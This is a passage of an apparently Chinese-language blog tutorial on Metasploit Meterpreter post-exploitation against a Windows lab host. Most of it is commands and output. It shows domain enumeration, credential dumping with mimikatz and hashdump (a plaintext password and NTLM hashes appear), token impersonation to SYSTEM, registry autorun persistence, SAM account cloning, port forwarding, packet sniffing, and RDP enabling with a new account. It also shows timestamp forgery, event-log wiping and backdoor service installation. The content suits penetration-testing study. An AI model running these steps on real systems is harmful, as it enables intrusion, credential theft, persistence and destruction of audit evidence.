class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use post/windows/gather/enum_domain</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/enum_domain):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf post(windows/gather/enum_domain) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: test</span><br><span class="line">[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: test</span><br><span class="line">[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure><h2 id="0x03抓取密码"><a href="#0x03抓取密码" class="headerlink" title="0x03抓取密码"></a>0x03抓取密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz </span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line">...</span><br><span class="line">Mimikatz Commands</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    kerberos          Attempt to retrieve kerberos creds</span><br><span class="line">    livessp           Attempt to retrieve livessp creds</span><br><span class="line">    mimikatz_command  Run a custom command</span><br><span class="line">    msv               Attempt to retrieve msv creds (hashes)</span><br><span class="line">    ssp               Attempt to retrieve ssp creds</span><br><span class="line">    tspkg             Attempt to retrieve tspkg creds</span><br><span class="line">    wdigest           Attempt to retrieve wdigest creds</span><br><span class="line"></span><br><span class="line">meterpreter &gt; wdigest </span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs</span><br><span class="line">[+] Got SeDebugPrivilege</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;49485   NTLM                                    </span><br><span class="line">0;293672  Kerberos   TEST          Administrator  TopSec_2017</span><br><span class="line">0;996     Negotiate  TEST          TOPSEC$        ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c </span><br><span class="line">0;999     Negotiate  TEST          TOPSEC$        ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c</span><br></pre></td></tr></table></figure><p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf post(windows/gather/hashdump) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 2739ba60d0407daf0d866cb3ee4b6b9f...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f013ff76154a124f8cfc32f654582420:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure></p><h2 id="0x04假冒令牌"><a href="#0x04假冒令牌" class="headerlink" title="0x04假冒令牌"></a>0x04假冒令牌</h2><p><code>空格和斜杠注意转译</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;  use incognito</span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line">...</span><br><span class="line">Incognito Commands</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Command              Description</span><br><span class="line">    -------              -----------</span><br><span class="line">    add_group_user       Attempt to add a user to a global group with all tokens</span><br><span class="line">    add_localgroup_user  Attempt to add a user to a local group with all tokens</span><br><span class="line">    add_user             Attempt to add a user with all tokens</span><br><span class="line">    impersonate_token    Impersonate specified token</span><br><span class="line">    list_tokens          List tokens available under current user context</span><br><span class="line">    snarf_hashes         Snarf challenge/response hashes for every token</span><br><span class="line"></span><br><span class="line">meterpreter &gt; list_tokens </span><br><span class="line">Usage: list_tokens &lt;list_order_option&gt;</span><br><span class="line"></span><br><span class="line">Lists all accessible tokens and their privilege level</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -g        List tokens by unique groupname</span><br><span class="line">    -u        List tokens by unique username</span><br><span class="line"></span><br><span class="line">meterpreter &gt; list_tokens  -u</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token NT AUTHORITY\\SYSTEM</span><br><span class="line">[-] User token NT not found</span><br><span class="line">meterpreter &gt; impersonate_token NT\ AUTHORITY\\SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2 id="0X05注册表操作"><a href="#0X05注册表操作" class="headerlink" title="0X05注册表操作"></a>0X05注册表操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg -h</span><br><span class="line">Usage: reg [command] [options]</span><br><span class="line"></span><br><span class="line">Interact with the target machine&apos;s registry.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d &lt;opt&gt;  The data to store in the registry value.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).</span><br><span class="line">    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials</span><br><span class="line">    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).</span><br><span class="line">    -v &lt;opt&gt;  The registry value name (E.g. Stuff).</span><br><span class="line">    -w        Set KEY_WOW64 flag, valid values [32|64].</span><br><span class="line">COMMANDS:</span><br><span class="line"></span><br><span class="line">    enumkeyEnumerate the supplied registry key [-k &lt;key&gt;]</span><br><span class="line">    createkeyCreate the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    deletekeyDelete the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    queryclass Queries the class of the supplied key [-k &lt;key&gt;]</span><br><span class="line">    setvalSet a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]</span><br><span class="line">    deletevalDelete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]</span><br><span class="line">    queryvalQueries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]</span><br></pre></td></tr></table></figure><p>下面演示通过注册表设置开机自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line">VMware User Process</span><br><span class="line"></span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note -d &apos;C:\Windows\System32\notepad.exe&apos;</span><br><span class="line">Successfully set note of REG_SZ.</span><br><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">  Values (2):</span><br><span class="line"></span><br><span class="line">VMware User Process</span><br><span class="line">note</span><br><span class="line"></span><br><span class="line">meterpreter &gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note </span><br><span class="line">Key: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line">Name: note</span><br><span class="line">Type: REG_SZ</span><br><span class="line">Data: C:\Windows\System32\notepad.exe</span><br></pre></td></tr></table></figure><p>下面演示怎么通过注册表复制克隆用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg enumkey -k HKLM\\sam\\sam\\domains\\account\\users</span><br><span class="line">Enumerating: HKLM\sam\sam\domains\account\users</span><br><span class="line"></span><br><span class="line">  Keys (3):</span><br><span class="line"></span><br><span class="line">000001F4</span><br><span class="line">000001F5</span><br><span class="line">Names</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1884 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\windows\system32&gt;net user guest /active:yes                </span><br><span class="line">net user guest /active:yes</span><br><span class="line"></span><br><span class="line">C:\windows\system32&gt;reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5</span><br><span class="line">reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5</span><br><span class="line"> sam\sam\domains\account\users\000001f4\F �Ѵ��ڣ�Ҫ������(Yes/No/All)? Yes</span><br><span class="line">\ֵ sam\sam\domains\account\users\000001f4\V �Ѵ��ڣ�Ҫ������(Yes/No/All)?No  </span><br><span class="line">�����ɹ����ɡ�</span><br></pre></td></tr></table></figure><h2 id="0x06端口转发"><a href="#0x06端口转发" class="headerlink" title="0x06端口转发"></a>0x06端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd delete -l 3389</span><br><span class="line">[*] Successfully stopped TCP relay on 0.0.0.0:3389</span><br><span class="line">meterpreter &gt; portfwd add -l 3389 -p 3389 -r 192.168.161.138</span><br><span class="line">[*] Local TCP relay created: :3389 &lt;-&gt; 192.168.161.138:3389</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote                Direction</span><br><span class="line">   -----  -----         ------                ---------</span><br><span class="line">   1      0.0.0.0:3389  192.168.161.138:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br></pre></td></tr></table></figure><h2 id="0x07搜索文件"><a href="#0x07搜索文件" class="headerlink" title="0x07搜索文件"></a>0x07搜索文件</h2><p>在awd攻防赛的时候很好用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f *flag*</span><br><span class="line">Found 3 results...</span><br><span class="line">    c:\flag.txt (39 bytes)</span><br><span class="line">    c:\Users\administrator.TEST\AppData\Roaming\Microsoft\Windows\Recent\flag.txt.lnk (477 bytes)</span><br><span class="line">    c:\Users\Administrator.ZGC-20160413JJL\AppData\Roaming\Microsoft\Windows\Recent\flag.txt.lnk (477 bytes)</span><br></pre></td></tr></table></figure></p><h2 id="0x08抓包"><a href="#0x08抓包" class="headerlink" title="0x08抓包"></a>0x08抓包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer</span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Sniffer Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command             Description</span><br><span class="line">    -------             -----------</span><br><span class="line">    sniffer_dump        Retrieve captured packet data to PCAP file</span><br><span class="line">    sniffer_interfaces  Enumerate all sniffable network interfaces</span><br><span class="line">    sniffer_release     Free captured packets on a specific interface instead of downloading them</span><br><span class="line">    sniffer_start       Start packet capture on a specific interface</span><br><span class="line">    sniffer_stats       View statistics of an active capture</span><br><span class="line">    sniffer_stop        Stop packet capture on a specific interface</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_interfaces</span><br><span class="line"></span><br><span class="line">1 - &apos;WAN Miniport (Network Monitor)&apos; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</span><br><span class="line">2 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">3 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">4 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">5 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start 5</span><br><span class="line">[*] Capture started on interface 5 (50000 packet buffer)</span><br><span class="line">meterpreter &gt; sniffer_dump 5 /tmp/1.pcap</span><br><span class="line">[*] Flushing packet capture buffer for interface 5...</span><br><span class="line">[*] Flushed 2540 packets (1450560 bytes)</span><br><span class="line">[*] Downloaded 036% (524288/1450560)...</span><br><span class="line">[*] Downloaded 072% (1048576/1450560)...</span><br><span class="line">[*] Downloaded 100% (1450560/1450560)...</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to /tmp/1.pcap</span><br><span class="line">meterpreter &gt; sniffer_stop 5</span><br><span class="line">[*] Capture stopped on interface 5</span><br><span class="line">[*] There are 29 packets (2263 bytes) remaining</span><br><span class="line">[*] Download or release them using &apos;sniffer_dump&apos; or &apos;sniffer_release&apos;</span><br></pre></td></tr></table></figure><h2 id="0x09开启3389"><a href="#0x09开启3389" class="headerlink" title="0x09开启3389"></a>0x09开启3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run getgui -u haha -p password</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.</span><br><span class="line">[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]</span><br><span class="line">[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator</span><br><span class="line">[*] Carlos Perez carlos_perez@darkoperator.com</span><br><span class="line">[*] Setting user account for logon</span><br><span class="line">[*] Adding User: haha with Password: password</span><br><span class="line">[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc</span><br><span class="line">meterpreter &gt; run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc</span><br></pre></td></tr></table></figure><p>会新建个账号，并在后面删掉</p><h2 id="0x0A改变文件时间"><a href="#0x0A改变文件时间" class="headerlink" title="0x0A改变文件时间"></a>0x0A改变文件时间</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Usage: timestomp &lt;file(s)&gt; OPTIONS</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -a &lt;opt&gt;  Set the &quot;last accessed&quot; time of the file</span><br><span class="line">    -b        Set the MACE timestamps so that EnCase shows blanks</span><br><span class="line">    -c &lt;opt&gt;  Set the &quot;creation&quot; time of the file</span><br><span class="line">    -e &lt;opt&gt;  Set the &quot;mft entry modified&quot; time of the file</span><br><span class="line">    -f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file</span><br><span class="line">    -h        Help banner</span><br><span class="line">    -m &lt;opt&gt;  Set the &quot;last written&quot; time of the file</span><br><span class="line">    -r        Set the MACE timestamps recursively on a directory</span><br><span class="line">    -v        Display the UTC MACE values of the file</span><br><span class="line">    -z &lt;opt&gt;  Set all four attributes (MACE) of the file</span><br><span class="line"></span><br><span class="line">meterpreter &gt; timestomp -v flag.txt</span><br><span class="line">[*] Showing MACE attributes for flag.txt</span><br><span class="line">Modified      : 2017-02-22 14:55:50 +0800</span><br><span class="line">Accessed      : 2017-01-11 20:53:57 +0800</span><br><span class="line">Created       : 2017-01-11 20:53:57 +0800</span><br><span class="line">Entry Modified: 2017-02-22 14:55:50 +0800</span><br><span class="line">meterpreter &gt; timestomp -v 1.txt</span><br><span class="line">[*] Showing MACE attributes for 1.txt</span><br><span class="line">Modified      : 2018-03-19 20:13:36 +0800</span><br><span class="line">Accessed      : 2018-03-19 21:41:24 +0800</span><br><span class="line">Created       : 2018-03-19 21:41:24 +0800</span><br><span class="line">Entry Modified: 2018-03-19 21:41:24 +0800</span><br><span class="line">meterpreter &gt; timestomp 1.txt -f flag.txt</span><br><span class="line">[*] Pulling MACE attributes from flag.txt</span><br><span class="line">[*] Setting specific MACE attributes on 1.txt</span><br><span class="line">meterpreter &gt; timestomp -v 1.txt</span><br><span class="line">[*] Showing MACE attributes for 1.txt</span><br><span class="line">Modified      : 2017-02-22 14:55:50 +0800</span><br><span class="line">Accessed      : 2017-01-11 20:53:57 +0800</span><br><span class="line">Created       : 2017-01-11 20:53:57 +0800</span><br><span class="line">Entry Modified: 2017-02-22 14:55:50 +0800</span><br></pre></td></tr></table></figure><h2 id="0x0B日志清除"><a href="#0x0B日志清除" class="headerlink" title="0x0B日志清除"></a>0x0B日志清除</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping 1692 records from Application...</span><br><span class="line">[*] Wiping 6855 records from System...</span><br><span class="line">[*] Wiping 2664 records from Security...</span><br></pre></td></tr></table></figure><h2 id="0X0C留后门"><a href="#0X0C留后门" class="headerlink" title="0X0C留后门"></a>0X0C留后门</h2><ol><li>Metsvc(通过服务安装)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~1.TES\AppData\Local\Temp\ENDPAzIy...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line"> * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure><p>这个时候我们去连接它</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set payload windows/metsvc_bind_tcp</span><br><span class="line">payload =&gt; windows/metsvc_bind_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set rhost 192.168.161.132</span><br><span class="line">rhost =&gt; 192.168.161.132</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 31337</span><br><span class="line">lport =&gt; 31337</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 192.168.161.132 - Meterpreter session 6 closed.  Reason: Died</span><br><span class="line">[*] Meterpreter session 6 opened (127.0.0.1 -&gt; 127.0.0.1) at 2018-03-19 21:37:23 +0800</span><br></pre></td></tr></table></figure><ol start="2"><li>persistence(通过自启动安装)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 